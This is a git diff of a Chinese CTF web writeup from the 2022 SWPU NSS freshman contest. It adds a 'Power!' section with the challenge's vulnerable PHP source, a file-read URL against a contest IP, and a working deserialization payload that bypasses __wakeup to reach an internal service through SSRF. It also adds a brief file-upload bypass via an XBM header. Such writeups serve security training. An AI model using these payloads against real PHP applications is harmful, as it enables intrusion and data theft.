@@ -1,8 +1,8 @@
 ---
 title: "2022 SWPU NSS 新生赛 Web Writeup"
-date: 2022-10-03T16:20:52+08:00
-lastmod: 2022-10-03T16:20:52+08:00
-draft: true
+date: 2022-10-25T9:20:52+08:00
+lastmod: 2022-10-25T9:20:52+08:00
+draft: false
 author: "X1r0z"
 
 tags: ['ctf']
@@ -17,6 +17,8 @@ math:
   enable: false
 lightgallery: false
 ---
+
+简单题
 
 <!--more-->
 
@@ -350,25 +352,23 @@ echo serialize($a);
 
 ```php
 <?php
- 
+
 class lyh{
     public $url = 'NSSCTF.com';
     public $lt;
     public $lly;
-     
+
      function  __destruct()
      {
         $a = $this->lt;
 
         $a($this->lly);
      }
-    
-    
+
 }
 unserialize($_POST['nss']);
 highlight_file(__FILE__);
- 
- 
+
 ?> 
 ```
 
@@ -517,9 +517,140 @@ echo serialize($a);
         echo $flag;
     }
 
-    
 ?>
 ```
 
 ![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210201143669.png)
 
+## Power!
+
+php 反序列化 + ssrf
+
+```php
+<?php
+class FileViewer{
+    public $black_list = "flag";
+    public $local = "http://127.0.0.1/";
+    public $path;
+    public function __call($f,$a){
+        $this->loadfile();
+    }
+    public function loadfile(){
+        if(!is_array($this->path)){
+            if(preg_match("/".$this->black_list."/i",$this->path)){
+                $file = $this->curl($this->local."cheems.jpg");
+            }else{
+                $file = $this->curl($this->local.$this->path);
+            }
+        }else{
+            $file = $this->curl($this->local."cheems.jpg");
+        }
+        echo '<img src="data:jpg;base64,'.base64_encode($file).'"/>';
+    }
+    public function curl($path){
+        $url = $path;
+        $curl = curl_init();
+        curl_setopt($curl, CURLOPT_URL, $url);
+        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($curl, CURLOPT_HEADER, 0);
+        $response = curl_exec($curl);
+        curl_close($curl);
+        return $response;
+    }
+    public function __wakeup(){
+        $this->local = "http://127.0.0.1/";
+    }
+}
+class Backdoor{
+    public $a;
+    public $b;
+    public $superhacker = "hacker.jpg";
+    public function goodman($i,$j){
+        $i->$j = $this->superhacker;
+    }
+    public function __destruct(){
+        $this->goodman($this->a,$this->b);
+        $this->a->c();
+    }
+}
+if(isset($_GET['source'])){
+    highlight_file(__FILE__);
+}else{
+    if(isset($_GET['image_path'])){
+        $path = $_GET['image_path'];    //flag in /flag.php
+        if(is_string($path)&&!preg_match("/http:|gopher:|glob:|php:/i",$path)){
+            echo '<img src="data:jpg;base64,'.base64_encode(file_get_contents($path)).'"/>';
+        }else{
+            echo '<h2>Seriously??</h2><img src="data:jpg;base64,'.base64_encode(file_get_contents("cheems.jpg")).'"/>';
+        }
+
+    }else if(isset($_GET['path_info'])){
+        $path_info = $_GET['path_info'];
+        $FV = unserialize(base64_decode($path_info));
+        $FV->loadfile();
+    }else{
+        $path = "vergil.jpg";
+        echo '<h2>POWER!!</h2>
+        <img src="data:jpg;base64,'.base64_encode(file_get_contents($path)).'"/>';
+    }
+}
+?>
+```
+
+先读取 flag.php
+
+````
+http://43.142.108.3:28827/?image_path=flag.php
+````
+
+base64 解密
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210250935614.png)
+
+提示真正的 flag 在 `127.0.0.1:65500`, 那么就需要使用那两个类来进行 ssrf
+
+FileViewer 类有 \_\_wakeup, 但题目 php 版本有点高, 无法改数字绕过, 这时候就需要换个思路
+
+注意到 Backdoor 类的 goodman 方法可以修改某个对象的属性, 而 goodman 又是在 \_\_destruct 里被触发的, 刚好在 \_\_wakeup 之后
+
+那么就可以在 \_\_destruct 的时候重新给 FileViewer 赋值 local, 从而间接地绕过 \_\_wakeup
+
+payload 如下
+
+```php
+<?php
+class FileViewer{
+    public $local = "http://127.0.0.1:65500/";
+    public $path = '';
+}
+    class Backdoor{
+    public $a;
+    public $b;
+    public $superhacker;
+}
+
+$y = new FileViewer();
+$x = new Backdoor();
+$x->a = $y;
+$x->b = 'local';
+$x->superhacker = 'http://127.0.0.1:65500/';
+$z = new FileViewer();
+$z->test = $x;
+echo base64_encode(serialize($z));
+```
+
+注意程序在 unserialize 之后会调用 `$FV->loadfile();`, 如果 `$FV` 不是 FileViewer 类的实例则会抛出异常, 导致 Backdoor 类的 \_\_destruct 不会成功执行
+
+解决方法就是再实例化一个 FileViewer 对象 将 Backdoor 塞进这个对象的某个属性里 (php 可以反序列化出不存在的属性)
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210250942535.png)
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210250943748.png)
+
+## file_master
+
+简单文件上传, 用 xbm 头绕过图片长宽的检测
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210250846919.png)
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210250846640.png)
